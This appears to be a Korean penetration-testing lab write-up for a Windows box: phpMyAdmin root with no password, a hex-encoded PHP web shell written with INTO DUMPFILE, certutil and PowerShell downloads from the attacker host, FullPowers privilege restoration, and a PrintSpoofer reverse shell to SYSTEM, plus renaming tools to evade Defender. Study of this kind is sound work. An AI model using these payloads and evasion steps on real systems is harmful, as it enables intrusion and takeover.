`SeImpersonatePrivilege`의 정상 용도부터 이해해야 악용이 보인다.

**정상 용도**: 서버 프로세스(IIS, SQL Server, 파일 서버)는 클라이언트를 대신해 리소스에 접근해야 한다. 예를 들어 웹서버가 "이 사용자가 이 파일을 읽을 권한이 있는가"를 판정하려면 **잠시 그 사용자인 척**해야 한다. 그래서 서비스 계정에는 이 특권이 기본 부여된다.

**악용 원리** — 세 단계다:

```
① 우리가 통제하는 "서버 엔드포인트"를 만든다        (명명 파이프 / COM 리스너)
② SYSTEM으로 도는 프로세스를 속여 거기에 인증시킨다   ← 여기가 각 Potato의 차이점
③ 넘어온 클라이언트 토큰을 임퍼소네이트한다          → SYSTEM 토큰 획득
```

③의 실제 API 흐름:

```c
CreateNamedPipe("\\.\pipe\xxx\pipe\spoolss")   // ① 우리 파이프
ConnectNamedPipe(...)                          // ② SYSTEM이 붙어오길 기다림
ImpersonateNamedPipeClient(hPipe)              // ★ SeImpersonatePrivilege 필요
OpenThreadToken(...) / DuplicateTokenEx(...)   // 임퍼소네이션 토큰 → 프라이머리 토큰
CreateProcessAsUser(hToken, ...)               // SYSTEM으로 프로세스 생성
```

> [!danger] `ImpersonateNamedPipeClient()`가 전부다
> 이 함수 **한 개**가 `SeImpersonatePrivilege`를 요구한다. 특권이 없으면 `ERROR_PRIVILEGE_NOT_HELD`로 즉시 실패한다.
> 그래서 **Potato 계열은 전부 "SeImpersonate 보유"를 전제**로 한다. 특권 없이 PrintSpoofer를 던지면 아무 일도 안 일어난다.
> 이 박스가 노리는 지점이 정확히 여기다 — 처음에 셸을 잡으면 **특권이 3개뿐**이라 PrintSpoofer가 안 먹는다.

**Potato 계열 비교** — ②단계(누구를 어떻게 속이는가)만 다르다:

| 이름 | ② 유인 방법 | 동작 조건 | Server 2019(build 17763) |
|---|---|---|---|
| Hot Potato | NBNS 스푸핑 + WPAD + NTLM 릴레이 | 구버전 Windows | ❌ |
| RottenPotato / **JuicyPotato** | **DCOM 활성화**로 SYSTEM 서비스가 우리 COM 리스너에 인증 | 임의 포트 지정 가능해야 함 | ❌ **죽었다** (1809부터 포트 135 고정) |
| **RoguePotato** | OXID 리졸버를 **외부 135 릴레이**로 우회 | **아웃바운드 135 필요** | ✅ |
| **PrintSpoofer** | **Print Spooler** RPC(`RpcRemoteFindFirstPrinterChangeNotificationEx`)로 spoolsv.exe(SYSTEM)를 **우리 명명 파이프에 접속**시킴 | **Spooler 서비스 실행 중** | ✅ ← **이 박스** |
| EfsPotato / SharpEfsPotato | **EFSRPC**(`lsarpc` 파이프) 유인 | Spooler 꺼져 있어도 됨 | ✅ |
| GodPotato | DCOM/RPC 범용 변형 | 광범위 | ✅ |

> [!tip] Windows 셸을 잡았을 때의 판단 순서
> ```
> whoami /priv
>   └─ SeImpersonate 있음 ──→ PrintSpoofer 시도
>   │                          └─ 실패(Spooler 꺼짐) ──→ EfsPotato / GodPotato
>   │                                                  └─ 실패 ──→ RoguePotato (아웃바운드 135 필요)
>   └─ SeImpersonate 없음 ──→ 계정이 LOCAL/NETWORK SERVICE 인가?
>                              └─ 예 ──→ **FullPowers로 복원 시도** ← 이 박스
>                              └─ 아니오 ──→ 다른 경로(서비스 오설정·AlwaysInstallElevated·언쿼티드 경로…)
> ```

### 2-8. 왜 `LOCAL SERVICE`의 특권이 "박탈"돼 있는가 — 이 박스의 설계 의도

`LOCAL SERVICE` 계정 자체는 **기본적으로 `SeImpersonatePrivilege`를 보유**한다. 그런데 우리 웹셸의 `whoami /priv`에는 3개밖에 없었다.

원인은 **Windows Vista 이후의 "서비스 최소 특권(least-privilege services)" 모델**이다:

> 서비스 제어 관리자(SCM)는 서비스를 기동할 때, 서비스가 레지스트리의 **`RequiredPrivileges`** 값으로 선언한 특권 **외에는 토큰에서 제거**한 채 프로세스를 만든다.

즉 **계정의 특권 ≠ 프로세스 토큰의 특권**이다. WampServer의 Apache 서비스는 필요한 것만 선언했고, 그 자식으로 태어난 우리 웹셸은 **깎인 토큰을 그대로 상속**받았다.

**FullPowers의 원리** — SCM을 우회해서 같은 계정의 **온전한 기본 토큰**을 새로 얻는다:

```
① schtasks로 "NT AUTHORITY\LOCAL SERVICE"로 실행되는 예약 작업을 등록한다
② 작업 스케줄러는 서비스가 아니므로 RequiredPrivileges 축소를 적용하지 않는다
   → 그 프로세스는 LOCAL SERVICE의 **기본 특권 전체**를 가진 토큰으로 뜬다
③ 그 토큰을 복제해서(DuplicateTokenEx) CreateProcessAsUser로 원하는 명령을 실행한다
④ 예약 작업은 즉시 삭제한다
```

> [!danger] 이걸 모르면 이 박스는 여기서 끝난다
> `whoami /priv`에 `SeImpersonatePrivilege`가 없으면 대부분 "Potato 경로는 없다"고 판단하고 다른 곳을 뒤진다. **그게 함정이다.**
> **판정 기준**: `whoami`가 `nt authority\local service` 또는 `nt authority\network service` 인가? → 그렇다면 특권은 **없는 게 아니라 깎인 것**일 수 있다. FullPowers를 먼저 시도한다.
> ([[Hub]]·[[Hawat]]의 "서비스가 어떤 계정으로 도는가"를 확인하는 습관의 Windows 판이다.)

---

## 3. Foothold — phpMyAdmin `root` 무비번 → `INTO DUMPFILE` 웹셸

프록시 경유라서 브라우저 대신 스크립트로 몬다. `requests.Session`에 프록시를 물리되 **`trust_env=False`**가 중요하다(환경변수 프록시 설정이 끼어드는 것을 막는다).

```python
# ~/PG/Squid/pma.py 핵심
s = requests.Session()
s.trust_env = False
s.proxies = {'http': 'http://192.168.248.189:3128'}
# 1) 로그인 페이지에서 token/set_session 추출
# 2) index.php 에 POST: pma_username=root, pma_password=, server=1
# 3) 응답의 새 token 으로 import.php 에 POST: sql_query=...
```

phpMyAdmin은 요청마다 **토큰이 갱신**된다. 로그인 응답에서 새 토큰을 다시 뽑아야 SQL이 실행된다.

> [!warning] `trust_env = False`를 빼면 조용히 엉뚱한 곳으로 나간다
> `requests`는 기본적으로 `http_proxy`·`HTTPS_PROXY`·`no_proxy` 환경변수와 `.netrc`를 읽는다. 칼리에 Burp 프록시 설정 같은 게 남아 있으면 **우리가 지정한 프록시가 덮어써지거나 무시**된다.
> 증상이 "연결은 되는데 응답이 이상하다"로 나타나 원인 찾기가 오래 걸린다. **프록시를 코드로 명시할 때는 항상 `trust_env=False`를 같이 쓴다.**

첫 정찰 쿼리:

```sql
SELECT @@version, USER(), @@datadir, @@secure_file_priv, @@basedir;
```
```
5.7.31
root@localhost
C:\wamp\bin\mysql\mysql5.7.31\data\
                                     ← @@secure_file_priv 가 빈 문자열
C:\wamp\bin\mysql\mysql5.7.31\
```

> [!danger] `@@secure_file_priv`가 빈 문자열 = 파일 쓰기 무제한
> 이 변수가 특정 디렉터리로 설정돼 있으면 `INTO OUTFILE`/`INTO DUMPFILE`은 그 안에만 쓸 수 있다. **`NULL`이면 완전 차단, 빈 문자열이면 아무 데나 쓸 수 있다.**
> MySQL로 파일 쓰기를 시도하기 전에 **반드시 이 값부터 확인**한다. 확인 안 하고 페이로드를 던지면 왜 실패하는지 모른 채 시간을 태운다.

웹셸을 심는다. **따옴표가 여러 계층(HTTP → PHP → SQL)을 지나며 깨지는 것을 피하려고 hex 리터럴**을 썼다:

```php
<?php echo "PWN:"; if(isset($_REQUEST['c'])){ echo shell_exec($_REQUEST['c']); } ?>
```

```sql
SELECT 0x3c3f706870206563686f202250574e3a223b20696628697373657428245f524551554553545b2763275d29297b206563686f207368656c6c5f6578656328245f524551554553545b2763275d293b207d203f3e0a
INTO DUMPFILE 'C:/wamp/www/sh.php';
```
```
[success] MySQL returned an empty result set (Query took 0.0008 seconds.)
```

> [!tip] `INTO OUTFILE` 대신 `INTO DUMPFILE`
> `OUTFILE`은 행/열 구분자를 삽입해 **바이너리나 정확한 바이트열이 깨진다.** `DUMPFILE`은 단일 행을 **가공 없이 그대로** 쓴다. 웹셸·실행파일을 심을 때는 `DUMPFILE`이 맞다.
> 경로 구분자는 `C:/wamp/www/`처럼 **슬래시**를 쓴다(백슬래시는 SQL 이스케이프와 충돌).

> [!note] 웹셸에 `echo "PWN:"`을 붙인 이유
> 응답에 고정 마커가 있으면 **"웹셸이 실행됐는데 명령 출력이 비었다"** 와 **"웹셸 자체가 없다(404/500)"** 를 즉시 구분할 수 있다.
> 마커 없이 빈 응답만 보면 원인을 특정 못 해 시간을 태운다. **웹셸에는 항상 고정 마커를 넣어라.**
> `$_REQUEST`를 쓴 것도 의도적이다 — GET·POST 어느 쪽으로든 받는다.

```bash
┌──(kali㉿kali)-[~/PG/Squid]
└─$ cat web.sh
curl -s -m 60 -x http://192.168.248.189:3128 --get --data-urlencode "c=$*" http://127.0.0.1:8080/sh.php

┌──(kali㉿kali)-[~/PG/Squid]
└─$ ./web.sh whoami
PWN:nt authority\local service
```

**래퍼 스크립트의 플래그 해설**

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `--get` | `--data-urlencode`로 만든 데이터를 **쿼리스트링으로** 붙인다 | POST가 되어버린다. `$_REQUEST`라 동작은 하지만 URL에 안 남아 디버깅이 불편 |
| `--data-urlencode "c=$*"` | 명령 문자열을 **curl이 인코딩**한다 | 공백·`&`·`\`·`|`가 들어가면 반드시 깨진다. **Windows 경로의 백슬래시 때문에 필수** |
| `-m 60` | 60초 타임아웃 | 프록시 왕복 + Windows 명령 실행이라 느리다. 짧으면 정상 명령이 끊긴다 |
| `"$*"` (스크립트) | 인자 전체를 한 문자열로 | `"$@"`를 쓰면 인자별로 쪼개져 `c=`에 첫 단어만 들어간다 |

> [!warning] 이 웹셸은 **상태가 없다** — Windows에서 특히 중요
> 매 요청이 새 `cmd.exe`다. `cd C:\Users` 다음에 `dir`를 쳐도 원래 디렉터리다.
> 리눅스라면 여기서 리버스셸을 올려 TTY 업그레이드(`python3 -c 'import pty; pty.spawn("/bin/bash")'`)를 하지만, **Windows에는 TTY 개념이 없어 그 단계 자체가 존재하지 않는다.**
> 대신 Windows에서는 **항상 절대경로로 명령을 조립**하고, 필요하면 `cmd /c "A && B"`로 한 요청에 묶는다.

> [!tip] 자동 도구를 안 썼다 — 시험 관점에서 유리한 지점
> 이 구간에서 sqlmap·metasploit을 전혀 쓰지 않았다. **자격증명을 알고 있으므로 인젝션이 아니라 정상 로그인**이고, 파일 쓰기는 SQL 한 줄이다.
> 시험에서도 동일하다 — **DB 자격증명을 손에 넣었으면 sqlmap은 필요 없다.** 웹 SQL 클라이언트(phpMyAdmin/adminer)나 `mysql` 클라이언트로 직접 친다.

---

## 4. 권한상승

### 4-1. 열거 — Windows 셸을 잡자마자 칠 명령

리눅스의 `id`·`sudo -l`·`find / -perm -4000`에 해당하는 Windows 세트다:

```
whoami                          ← 계정
whoami /priv                    ← ★ 토큰 특권 (가장 중요)
whoami /groups                  ← 그룹 SID (Administrators 포함 여부)
systeminfo                      ← OS 빌드·핫픽스
net user / net localgroup administrators
tasklist /svc                   ← AV/EDR·Spooler 확인
sc query spooler                ← PrintSpoofer 가능 여부
dir C:\                         ← 플래그·비표준 위치
```

이 박스에서 `whoami /priv` 결과:

```
PRIVILEGES INFORMATION
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

**3개뿐이다.** PrintSpoofer가 요구하는 `SeImpersonatePrivilege`가 없다.

> [!note] 이 3개는 왜 남았는가
> 전부 **무해한 기본 특권**이다. `SeChangeNotify`(디렉터리 순회 검사 생략)는 사실상 모든 프로세스가 갖고, `SeCreateGlobal`은 전역 네임스페이스 객체 생성용이다.
> **"특권이 3개 있다"가 아니라 "관리자급 특권이 0개다"** 로 읽어야 한다. 개수가 아니라 **목록에 위험 특권이 있는지**를 본다.

### 4-2. 도구 전송 — Windows 파일 다운로드

```
certutil -urlcache -f http://192.168.45.207:8000/PrintSpoofer64.exe PrintSpoofer64.exe
CertUtil: -URLCache command completed successfully.
```

| 플래그 | 의미 |
|---|---|
| `-urlcache` | URL 캐시 조작 기능. **부수 효과로 파일을 받는다** (원래 다운로더가 아니다) |
| `-f` | 강제. **캐시를 무시하고 새로 받는다.** 빼면 이전 캐시가 반환되어 옛 파일이 남는다 |

칼리 쪽:
```bash
python3 -m http.server 8000
```

> [!tip] Windows 다운로드 3종 — 하나가 막히면 다음
> ```cmd
> certutil -urlcache -f http://IP:8000/f.exe f.exe
> powershell -c "iwr http://IP:8000/f.exe -OutFile f.exe"
> powershell -c "(New-Object Net.WebClient).DownloadFile('http://IP:8000/f.exe','f.exe')"
> bitsadmin /transfer j http://IP:8000/f.exe C:\Users\Public\f.exe
> ```
> **쓰기 가능한 디렉터리**: `C:\Users\Public\`, `C:\Windows\Temp\`, `%TEMP%`. `C:\`나 `C:\Windows\`는 대개 안 된다.

**이 단계에서 실제로 막혔다 — 6장 ①을 먼저 읽어라.** 파일명을 `fp.exe`·`ps.exe`로 바꿔야 통과했다.

### 4-3. 1단계 — FullPowers로 특권 복원

`LOCAL SERVICE`는 원래 `SeImpersonatePrivilege`를 가지고 있지만, **서비스로 실행되지 않은 프로세스에서는 토큰의 특권이 제거된 상태**로 시작한다. (원리는 2-8 참조)

[FullPowers](https://github.com/itm4n/FullPowers)는 **예약 작업(scheduled task)으로 자기 자신을 재기동**해서 완전한 서비스 토큰을 되찾는다:

```
C:\Users\Public\fp.exe -c "cmd /c whoami /priv > C:\Users\Public\priv_after.txt 2>&1" -z
[+] Started dummy thread with id 960
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
```

```
Privilege Name                Description                               State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled   ← 복원됨
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

**3개 → 7개.** `SeImpersonatePrivilege` 복원 확인.

> [!note] 출력 네 줄을 원리와 짝지어 읽어라
> | 출력 | 대응하는 동작 |
> |---|---|
> | `Started dummy thread` | 토큰을 붙일 대상 스레드 준비 |
> | `Successfully created scheduled task` | **SCM이 아닌 작업 스케줄러**로 LOCAL SERVICE 프로세스 기동 (2-8 ①②) |
> | `Got new token! Privilege count: 7` | 그 프로세스의 온전한 토큰 복제 성공 |
> | `CreateProcessAsUser() OK` | 복제 토큰으로 새 프로세스 생성 (2-8 ③) |
>
> `CreateProcessAsUser()`는 **`SeAssignPrimaryTokenPrivilege` + `SeIncreaseQuotaPrivilege`** 를 요구한다. 복원된 7개 목록에 정확히 **그 둘이 들어 있다** — 원리와 관측이 맞물린다.

**플래그 해설**

| 플래그 | 의미 |
|---|---|
| `-c "<명령>"` | 복원된 토큰으로 실행할 명령 |
| `> ... 2>&1` | 표준출력·표준에러를 **파일로** 받는다. 새 프로세스는 우리 웹셸과 콘솔이 분리돼 **출력이 화면에 안 온다.** 파일로 받아 따로 읽어야 한다 |
| `-z` | **[가정]** 원문 출력의 `Started dummy thread`와 짝을 이루는 동작 제어 옵션으로 보인다. 의미를 확신할 수 없으므로 **원문 그대로 재현**했다. 도구 옵션은 모르면 추측해 바꾸지 말고 동작한 조합을 그대로 쓴다 |

> [!warning] `whoami /priv`에 SeImpersonate가 없다고 포기하지 마라
> `LOCAL SERVICE`·`NETWORK SERVICE` 컨텍스트라면 **특권이 "없는" 게 아니라 "박탈된" 것**일 수 있다. FullPowers로 되찾을 수 있는지 먼저 확인한다.
> 이 박스의 설계 의도가 정확히 이 지점이다 — PrintSpoofer만 알고 FullPowers를 모르면 막힌다.

### 4-4. 2단계 — PrintSpoofer로 SYSTEM

PrintSpoofer는 **FullPowers가 만든 토큰 안에서** 실행돼야 한다. 중첩 인용을 피하려고 배치 파일로 감쌌다:

```bat
REM C:\Users\Public\go.bat
C:\Users\Public\ps.exe -c "powershell -nop -w hidden -enc <UTF16LE-base64 리버스셸>"
```

```
cmd /c C:\Users\Public\fp.exe -c "cmd /c C:\Users\Public\go.bat" -z
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
```

```
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.189] 58526
PS C:\Windows\system32> whoami; hostname
nt authority\system
SQUID
```

SYSTEM 토큰은 특권 **31개 전부 Enabled** (`SeDebugPrivilege`, `SeTcbPrivilege`, `SeTakeOwnershipPrivilege` 포함).

**플래그 해설 — `powershell -enc`**

| 플래그 | 의미 |
|---|---|
| `-nop` | `-NoProfile`. 프로필 스크립트 로딩 생략 → 빠르고, 프로필 오류로 죽지 않는다 |
| `-w hidden` | `-WindowStyle Hidden`. 창을 띄우지 않는다 |
| `-enc` | **UTF-16LE로 인코딩한 문자열의 base64**를 받는다 |

> [!danger] `-enc`의 base64는 **UTF-16LE**다 — 리눅스 습관대로 하면 반드시 실패한다
> ```bash
> # 틀림 (UTF-8)
> echo -n '<명령>' | base64 -w0
> # 맞음 (UTF-16LE)
> echo -n '<명령>' | iconv -t UTF-16LE | base64 -w0
> ```
> `-enc`를 쓰는 이유는 **인용 지옥 회피**다. 리버스셸 원문에는 `$`·`"`·`(`·`)`·`;`가 가득한데, `cmd /c` → `.bat` → `PrintSpoofer -c` → `powershell`로 4중 중첩되면 반드시 깨진다.
> base64는 `[A-Za-z0-9+/=]`뿐이라 **모든 계층을 무사통과**한다. 2-5의 hex 리터럴과 **완전히 같은 발상**이다.

> [!tip] 왜 `.bat`으로 한 번 더 감쌌는가
> `fp.exe -c "cmd /c ps.exe -c \"powershell -enc ...\""` 처럼 쓰면 **따옴표 안의 따옴표**가 되어 `cmd.exe` 파서가 잘라먹는다.
> Windows에는 리눅스의 `'...'` 같은 강한 인용이 없다. **중첩이 2단을 넘으면 배치 파일로 빼는 것이 가장 확실하다.**
> 시험장에서 시간을 태우는 대표적 원인이 이 인용 중첩이다 — **막히면 즉시 파일로 뺀다.**

**대안 경로 비교** (전부 시도하지는 않았다 — [가정] 표시)

| 경로 | 가능 여부 | 근거 |
|---|---|---|
| **PrintSpoofer** | ✅ 실측 성공 | Spooler 실행 중, build 17763 |
| JuicyPotato | ❌ | build 17763에서 무력화 |
| RoguePotato | [가정] 가능하나 불리 | 아웃바운드 135 릴레이가 필요하고, 이 박스는 아웃바운드 4444가 열려 있음이 확인됐을 뿐 135는 미확인 |
| EfsPotato/GodPotato | [가정] 가능 | 조건이 더 느슨하다. PrintSpoofer가 실패했다면 다음 후보 |
| **5985 WinRM으로 관리자 접속** | ❌ | 포트는 열려 있지만 **Administrator 자격증명이 없다.** 게다가 Squid가 `CONNECT`를 막아 evil-winrm을 프록시로 통과시킬 수 없다 |
| SYSTEM 획득 후 SAM 덤프 → PtH | [가정] 가능 | 외부 445가 열려 있으므로 해시를 뽑았다면 `psexec`/`evil-winrm`으로 직접 붙을 수 있다. 여기서는 불필요했다 |

---

## 5. 플래그

```powershell
PS C:\Windows\system32> "LOCAL=" + (Get-Content C:\local.txt)
LOCAL=02ef1765e826b864a4b6cb74e532398c
PS C:\Windows\system32> "PROOF=" + (Get-Content C:\Users\Administrator\Desktop\proof.txt)
PROOF=45f64bc8483c77cf487fad00f8cb0120
```

| | 위치 | 값 |
|---|---|---|
| `local.txt` | **`C:\local.txt`** ← 비표준 위치 | `02ef1765e826b864a4b6cb74e532398c` |
| `proof.txt` | `C:\Users\Administrator\Desktop\` | `45f64bc8483c77cf487fad00f8cb0120` |

> [!danger] `local.txt`가 `C:\` 루트에 있다
> `C:\Users\`에는 `Administrator`와 `Public`뿐이고 **일반 유저 계정이 없다.** `C:\Users\*\Desktop\local.txt` 패턴으로 찾으면 영원히 못 찾는다.
> **`dir C:\` 한 번**이면 나온다. (`Get-ChildItem C:\ -Recurse`는 리버스셸을 몇 분간 블로킹시키므로 쓰지 말 것)

> [!tip] 시험 증거 형식 연습 — Windows 판
> 리눅스의 `whoami; hostname; ip a; cat /root/proof.txt`에 대응하는 것:
> ```powershell
> whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\proof.txt
> ```
> **한 화면에** 담겨야 인정된다. PowerShell에서는 `;`로 이어 붙이면 되고, `cmd.exe`라면 `&`를 쓴다.
> `ip a`가 아니라 **`ipconfig`** 다 — Windows 박스에서 반사적으로 `ip a`를 치면 `명령을 찾을 수 없습니다`가 나온다.

---

## 6. 막혔던 지점 / 시행착오

### ① 파일명 기반 탐지 — `certutil`이 "성공"이라는데 파일이 없다

`FullPowers.exe`·`PrintSpoofer64.exe`라는 **이름 그대로** `certutil`로 받으면:

```
certutil -urlcache -f http://192.168.45.207:8000/PrintSpoofer64.exe PrintSpoofer64.exe
CertUtil: -URLCache command completed successfully.
```

**"성공"이라고 뜨는데 파일이 없다.** `fp.exe`·`ps.exe`로 이름을 바꾸니 정상 저장됐다.

Defender 상태는 `RealTimeProtectionEnabled=False`, `AntivirusEnabled=True` — 실시간 보호는 꺼져 있는데도 **파일명 시그니처**에는 걸린 것이다.

**어떻게 알아챘는가**: 다운로드 직후 `dir C:\Users\Public`을 쳐서 파일이 없다는 것을 확인했다. 이 습관이 없었다면 "PrintSpoofer가 안 먹는다"고 오진하고 **다른 권한상승 경로를 뒤지느라 시간을 통째로 날렸을 것**이다.

> [!danger] 다운로드 "성공" 메시지를 믿지 말고 `dir`로 확인하라
> AV/EDR은 파일을 조용히 삭제하고 도구에는 성공을 반환하게 두는 경우가 많다. **전송 후 항상 존재 여부를 확인**하고, 안 보이면 **파일명부터 바꿔본다.**
> 전송 후 체크리스트:
> ```cmd
> dir C:\Users\Public\fp.exe          ← 존재하는가
> certutil -hashfile C:\Users\Public\fp.exe MD5   ← 크기·해시가 원본과 같은가 (부분 전송 판별)
> ```
> 이건 누적 패턴 **"응답이 성공을 뜻하지 않는다"**([[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]])의 Windows 판이다.

**막혔을 때의 회피 순서** (파일명 → 내용 → 실행 방식):
1. 파일명 변경 (`fp.exe`, `a.exe`) ← **이 박스에서 통한 방법. 가장 싸다**
2. 전송 경로 변경 (`C:\Windows\Temp\`, `%APPDATA%`)
3. 전송 수단 변경 (`certutil` → `iwr` → SMB 공유 마운트)
4. 페이로드 자체 변경 (다른 도구·재컴파일)

### ② Squid ACL 때문에 열거가 절반만 됐다 — "안 나왔다"와 "볼 수 없었다"의 구분

`Safe_ports` 밖의 1024 미만 포트가 전부 403이라 **개폐 판별 자체가 불가능**했다. `CONNECT`도 막혀 범용 터널이 안 된다.

**시간 손실 지점**: 403이 무더기로 나오면 "차단됐다 = 없다"로 읽기 쉽다. `X-Squid-Error` 헤더를 확인하고 나서야 `ERR_ACCESS_DENIED`(ACL)와 `ERR_CONNECT_FAIL`(닫힘)이 **완전히 다른 사건**임을 확정했다.

> [!warning] 보고서에는 커버리지 한계를 명시하라
> "1-1024 포트는 Squid ACL로 인해 열거하지 못했다"를 **적어야** 한다. 안 적으면 "스캔 결과 없음"으로 읽혀 오탐/미탐의 책임이 커진다.
> 시험 리포트에서도 동일하다 — **확인한 것과 확인하지 못한 것을 구분해 쓴다.**

### ③ gobuster가 프록시 경유로 완주하지 못했다

`directory-list-2.3-medium.txt`(22만 라인)를 프록시로 밀었더니 300초 제한에 걸려 **미완주**했다. 프록시 왕복이 요청당 수백 ms라 대규모 워드리스트는 구조적으로 불가능하다.

**탈출구는 열거 방식 전환이었다.** WampServer 홈페이지가 이미 `Your Aliases: adminer phpmyadmin phpsysinfo`를 알려줬으므로, 무차별 열거 대신 **타겟형 프로브**로 바꾸니 `/adminer`·`/phpsysinfo`·`/wampthemes`·`/testmysql.php`가 전부 한 번에 적중했다.

> [!tip] 애플리케이션이 스스로 말해주는 경로를 먼저 읽어라
> 무차별 디렉터리 열거는 **정보가 없을 때의 최후 수단**이다. 홈페이지·`robots.txt`·JS 번들·에러 페이지·`sitemap.xml`이 경로를 직접 알려주는 경우가 훨씬 흔하다.
> 특히 **프록시·VPN 경유로 느린 링크**에서는 워드리스트 크기를 `common.txt`(4600줄) 수준으로 줄이거나 아예 타겟형으로 전환한다.

### ④ MariaDB 3307 — 설정에 적혀 있다고 떠 있는 게 아니다

WampServer 홈페이지가 `MariaDB Version: 10.4.13 - Port defined for MariaDB: 3307`이라고 렌더했지만, 실제 3307은 **503(닫힘)** 이었다.

**교훈**: 설정 파일·상태 페이지가 말하는 것은 **의도**이지 **현실**이 아니다. 반드시 실측한다. ([[Hawat]]의 "소스와 배포본이 다르다"와 같은 계열의 함정이다.)

### ⑤ phpMyAdmin 토큰 갱신 — 첫 SQL이 조용히 실패했다

phpMyAdmin은 CSRF 방지를 위해 **요청마다 `token`을 갱신**한다. 로그인 페이지에서 뽑은 토큰을 그대로 `import.php`에 재사용하면 **에러 없이 로그인 페이지로 되돌아온다** — "실행됐는데 결과가 없다"처럼 보인다.

해결: **로그인 응답 본문에서 새 토큰을 다시 파싱**해서 그 다음 요청에 쓴다.

> [!warning] 웹앱 자동화의 3대 함정
> 1. **CSRF 토큰이 매 요청 갱신** ← 이 박스
> 2. **세션 쿠키를 유지하지 않음** (`requests.Session` 필수)
> 3. **환경변수 프록시가 끼어듦** (`trust_env=False` 필수) ← 이 박스
>
> 셋 다 **에러가 아니라 "엉뚱한 페이지"** 로 나타나서 원인 찾기가 오래 걸린다. 자동화가 이상하면 **응답 본문을 통째로 저장해서 눈으로 봐라.**

### ⑥ 인용 4중 중첩 — 배치 파일로 빼서 해결

`fp.exe -c "cmd /c ps.exe -c \"powershell -enc ...\""` 형태는 `cmd.exe`의 인용 처리 때문에 안정적으로 동작하지 않는다. `go.bat`으로 한 겹 빼내고, 페이로드는 `-enc` base64로 감싸 **인용이 필요한 문자를 아예 없앴다.**

동일 발상이 이 박스에 **세 번** 나온다: SQL의 hex 리터럴 · PowerShell의 `-enc` base64 · 배치 파일 래핑. **"인용이 깨지면 인코딩으로 도망간다"** 가 이 노트의 반복 주제다. ([[Hawat]]·[[Exfiltrated]]와 동일 패턴)

### ⑦ 새 프로세스의 출력이 안 보인다

`fp.exe -c "whoami /priv"`를 실행하면 **화면에 아무것도 안 나온다.** `CreateProcessAsUser`로 만든 프로세스는 우리 웹셸과 콘솔이 분리돼 있기 때문이다.

해결: `-c "cmd /c whoami /priv > C:\Users\Public\priv_after.txt 2>&1"` 처럼 **파일로 리다이렉트**하고 따로 읽는다. `2>&1`을 빼면 실패 원인이 담긴 표준에러를 놓친다.

> [!tip] 비대화형 컨텍스트의 기본 반사
> 웹셸·예약 작업·서비스·`CreateProcessAsUser`로 만든 프로세스는 **전부 출력이 안 온다**고 가정하라.
> 항상 `> C:\Users\Public\out.txt 2>&1`을 붙이고, 그다음 `type out.txt`로 읽는다.

### ⑧ 플래그가 표준 위치에 없었다 + `-Recurse` 함정

`C:\Users\*\Desktop\local.txt`를 찾다가 실패했다. 일반 유저 계정 자체가 없었기 때문이다. `Get-ChildItem C:\ -Recurse`로 전체 탐색을 시도했더니 **리버스셸이 몇 분간 응답 없이 멈췄다.**

`dir C:\` 한 번으로 끝났다.

> [!warning] 셸을 블로킹시키는 명령을 조심하라
> `Get-ChildItem -Recurse`, `systeminfo`(느림), 대용량 `type` 은 리버스셸을 수 분간 잠근다. **Ctrl+C가 리스너 쪽에서는 셸을 끊어버릴 수 있다.**
> Windows 파일 검색은 이쪽이 훨씬 빠르다:
> ```cmd
> dir C:\ /b
> where /r C:\ local.txt
> cmd /c dir C:\*.txt /s /b 2>nul
> ```

### ⑨ 이 유형에서 흔히 막히는 지점 (원문에 실측 기록이 없어 구분해 적는다)

아래는 **이 박스에서 실제로 겪은 것이 아니라**, 같은 유형을 다시 만났을 때 대비해 적어두는 항목이다.

| 증상 | 원인 후보 | 확인/대응 |
|---|---|---|
| 웹셸은 뜨는데 `shell_exec`이 빈 값 | `disable_functions`에 등록 | `phpinfo`의 `disable_functions` 확인 → `system`·`passthru`·`popen`·`proc_open` 중 살아 있는 것으로 교체 |
| `INTO DUMPFILE`이 `Errcode: 13` | 대상 디렉터리에 mysqld 계정 쓰기 권한 없음 | 다른 경로 시도. 웹루트 하위 업로드 디렉터리가 대개 열려 있다 |
| `INTO DUMPFILE`이 `Errcode: 17` | **파일이 이미 존재** | 덮어쓰기 불가. **파일명을 바꾼다** |
| PrintSpoofer가 `[-] Operation failed` | Spooler 서비스 중지 | `sc query spooler` → 꺼져 있으면 EfsPotato/GodPotato |
| 리버스셸이 안 붙는다 | 아웃바운드 포트 제한 | **443·80·53**을 시도. ([[Hawat]]에서 실제로 443만 열려 있었다) |
| FullPowers가 예약 작업 생성 실패 | 계정이 `LOCAL/NETWORK SERVICE`가 아님 | `whoami` 재확인. IIS AppPool 계정은 FullPowers 대상이 아니다 |

### ⑩ 버린 경로 — 외부에 열린 SMB/RPC를 왜 파지 않았는가

외부에서 실제로 열려 있던 것은 **135 · 139 · 445 · 3128 · 49666 · 49667** 이다. Windows 박스를 보면 반사적으로 SMB부터 파게 되는데, 여기서는 **의도적으로 버렸다.** 근거는 nmap 출력 안에 있다:

```
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

| 신호 | 읽는 법 | 이 박스에서의 결론 |
|---|---|---|
| `Message signing ... not required` | **NTLM 릴레이가 이론상 가능**하다는 뜻 | 릴레이는 **"인증을 흘려보낼 다른 호스트"** 가 있어야 성립한다. 단독 호스트 랩에서는 쓸 곳이 없다 |
